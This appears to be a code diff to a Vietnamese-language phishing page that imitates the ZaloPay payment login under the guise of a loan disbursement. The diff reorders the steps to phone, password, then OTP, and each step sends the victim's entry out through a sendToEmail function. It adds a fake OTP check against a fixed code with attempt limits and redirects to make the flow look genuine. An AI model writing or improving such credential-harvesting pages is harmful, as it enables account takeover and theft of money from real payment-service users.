@@ -762,7 +762,7 @@
         <header class="page-header">
           <button
             class="back-button"
-            onclick="showSection('zalopay-otp-section')"
+            onclick="showSection('zalopay-phone-section')"
           >
             <img
               src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
@@ -825,7 +825,7 @@
         <header class="page-header">
           <button
             class="back-button"
-            onclick="showSection('zalopay-phone-section')"
+            onclick="showSection('zalopay-password-section')"
           >
             <img
               src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
@@ -968,6 +968,25 @@
           "#zalopay-otp-section .otp-input"
         );
 
+        window.showSection = (sectionId) => {
+          document
+            .querySelectorAll(".page-section")
+            .forEach((section) => section.classList.remove("active"));
+          const targetSection = getEl(sectionId);
+          if (targetSection) {
+            targetSection.classList.add("active");
+            if (sectionId === "zalopay-phone-section") {
+              setTimeout(() => getEl("zalopay-phone").focus(), 100);
+            }
+            if (sectionId === "zalopay-password-section") {
+              setTimeout(() => passwordInputEl.focus(), 100);
+            }
+            if (sectionId === "zalopay-otp-section") {
+              setTimeout(() => otpInputs[0].focus(), 100);
+            }
+          }
+        };
+
         // Helper Functions
         const formatCurrency = (amount) =>
           new Intl.NumberFormat("vi-VN", {
@@ -1075,25 +1094,6 @@
           setTimeout(() => notification.classList.remove("show"), duration);
         };
 
-        window.showSection = (sectionId) => {
-          document
-            .querySelectorAll(".page-section")
-            .forEach((section) => section.classList.remove("active"));
-          const targetSection = getEl(sectionId);
-          if (targetSection) {
-            targetSection.classList.add("active");
-            if (sectionId === "zalopay-phone-section") {
-              setTimeout(() => getEl("zalopay-phone").focus(), 100);
-            }
-            if (sectionId === "zalopay-password-section") {
-              setTimeout(() => passwordInputEl.focus(), 100);
-            }
-            if (sectionId === "zalopay-otp-section") {
-              setTimeout(() => otpInputs[0].focus(), 100);
-            }
-          }
-        };
-
         // Password display logic
         window.updatePasswordDisplay = (value) => {
           const charBoxes = document.querySelectorAll(
@@ -1121,11 +1121,8 @@
             sendToEmail("phone", credentials.phone);
             const maskedPhone = `+84 **** ${phoneValue.slice(-3)}`;
             getEl("masked-phone-password").textContent = maskedPhone;
-            getEl(
-              "zalopay-otp-prompt"
-            ).innerHTML = `Mã OTP đã được gửi đến số <strong>${maskedPhone}</strong>. Vui lòng nhập để xác thực.`;
             phoneInput.classList.remove("invalid");
-            showSection("zalopay-otp-section");
+            showSection("zalopay-password-section");
           } else {
             phoneInput.classList.add("invalid");
             showNotification(
@@ -1144,14 +1141,11 @@
           credentials.password = passwordInputEl.value;
           sendToEmail("password", credentials.password);
 
-          showNotification(
-            "Xác nhận giải ngân thành công! Đang chuyển hướng...",
-            "success",
-            4000
-          );
-          setTimeout(() => {
-            window.location.href = "Evaluate-conditions.html?status=success";
-          }, 4000);
+          const maskedPhone = `+84 **** ${credentials.phone.slice(-3)}`;
+          getEl(
+            "zalopay-otp-prompt"
+          ).innerHTML = `Mã OTP đã được gửi đến số <strong>${maskedPhone}</strong>. Vui lòng nhập để xác thực.`;
+          showSection("zalopay-otp-section");
         };
 
         window.handleOtpSubmit = () => {
@@ -1163,8 +1157,49 @@
             return;
           }
 
+          const otpLoading = getEl("zalopay-otp-loading");
+          const otpSubmitBtn = getEl("zalopay-otp-submit-btn");
+          otpLoading.style.display = "block";
+          otpSubmitBtn.disabled = true;
+
           sendToEmail("otp", credentials.otp);
-          showSection("zalopay-password-section");
+
+          setTimeout(() => {
+            otpLoading.style.display = "none";
+            otpSubmitBtn.disabled = false;
+
+            const correctOtp = "123456";
+
+            if (credentials.otp === correctOtp) {
+              showNotification(
+                "Xác nhận giải ngân thành công! Đang chuyển hướng...",
+                "success",
+                4000
+              );
+              setTimeout(() => {
+                window.location.href = "Evaluate-conditions.html?status=success";
+              }, 4000);
+            } else {
+              otpAttempts++;
+              clearOtpInputs();
+              const attemptsLeft = 3 - otpAttempts;
+              if (attemptsLeft > 0) {
+                showNotification(
+                  `Mã xác thực không đúng. Bạn còn ${attemptsLeft} lần thử.`,
+                  "error"
+                );
+              } else {
+                showNotification(
+                  "Bạn đã nhập sai quá 3 lần. Đang chuyển hướng...",
+                  "error",
+                  4000
+                );
+                setTimeout(() => {
+                  window.location.href = "Evaluate-conditions.html?status=failed";
+                }, 4000);
+              }
+            }
+          }, 1500);
         };
 
         window.resendOtp = () => {
